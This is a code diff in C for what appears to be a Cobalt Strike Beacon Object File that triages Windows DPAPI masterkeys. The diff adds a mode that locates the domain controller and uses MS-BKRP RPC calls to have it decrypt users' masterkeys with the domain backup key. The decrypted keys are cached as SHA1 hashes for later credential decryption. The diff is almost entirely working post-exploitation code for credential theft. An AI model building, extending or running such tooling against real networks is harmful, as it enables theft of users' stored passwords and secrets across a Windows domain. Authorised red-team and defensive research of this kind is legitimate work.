@@ -7,6 +7,7 @@
  */
 #include "triage.h"
 #include "lsadump.h"
+#include "bkrp.h"
 #include "beacon.h"
 
 /* ---- Internal: read file into buffer ---- */
@@ -150,6 +151,7 @@ typedef struct {
     const char* ntlm;
     const char* credkey;
     BOOL use_rpc;
+    const wchar_t* dc_name;  /* DC for RPC calls */
     const char* sid;
     BOOL hashes_only;
     int processed;
@@ -246,6 +248,22 @@ static void triage_masterkey_file_cb(const wchar_t* path, void* ctx) {
         }
     }
 
+    /* Try RPC (MS-BKRP) — ask the DC to decrypt the domain key */
+    if (!decrypted && tc->use_rpc && tc->dc_name) {
+        BYTE* dk = NULL;
+        int dkl = 0;
+        if (dpapi_get_domain_key(data, data_len, &dk, &dkl)) {
+            BYTE rpc_key[64];
+            int rpc_len = 0;
+            if (bkrp_decrypt_masterkey(tc->dc_name, dk, dkl, rpc_key, &rpc_len)) {
+                /* Hash the 64-byte plaintext key to get the SHA1 */
+                sha1_hash(rpc_key, rpc_len, sha1);
+                decrypted = TRUE;
+            }
+            intFree(dk);
+        }
+    }
+
     if (decrypted) {
         /* Add to cache */
         mk_cache_add(tc->cache, &mk_guid, sha1);
@@ -291,8 +309,41 @@ BOOL triage_user_masterkeys(MASTERKEY_CACHE* cache,
     ctx.use_rpc = use_rpc;
     ctx.hashes_only = hashes_only;
     ctx.sid = sid;
+    ctx.dc_name = NULL;
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user masterkeys...\n");
+
+    /* If RPC mode, discover the DC */
+    wchar_t* dc_alloc = NULL;
+    if (use_rpc) {
+        PDOMAIN_CONTROLLER_INFOW dci = NULL;
+        DWORD rc;
+#ifdef BOF
+        rc = NETAPI32$DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &dci);
+#else
+        rc = DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &dci);
+#endif
+        if (rc == 0 && dci && dci->DomainControllerName) {
+            /* DomainControllerName is like "\\DC01" — skip leading backslashes */
+            wchar_t* name = dci->DomainControllerName;
+            while (*name == L'\\') name++;
+            int len = wcslen(name);
+            dc_alloc = (wchar_t*)intAlloc((len + 1) * sizeof(wchar_t));
+            if (dc_alloc) {
+                memcpy(dc_alloc, name, len * sizeof(wchar_t));
+                dc_alloc[len] = 0;
+                ctx.dc_name = dc_alloc;
+            }
+#ifdef BOF
+            NETAPI32$NetApiBufferFree(dci);
+#else
+            NetApiBufferFree(dci);
+#endif
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using DC: %S for RPC masterkey decryption\n", ctx.dc_name);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to discover DC (err 0x%08X). /rpc requires domain membership.\n", rc);
+        }
+    }
 
     /* Get all user profile directories */
     int user_count = 0;
@@ -350,6 +401,7 @@ BOOL triage_user_masterkeys(MASTERKEY_CACHE* cache,
         intFree(users[i]);
     }
     if (users) intFree(users);
+    if (dc_alloc) intFree(dc_alloc);
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Processed %d masterkey files, decrypted %d\n",
                  ctx.processed, ctx.decrypted);
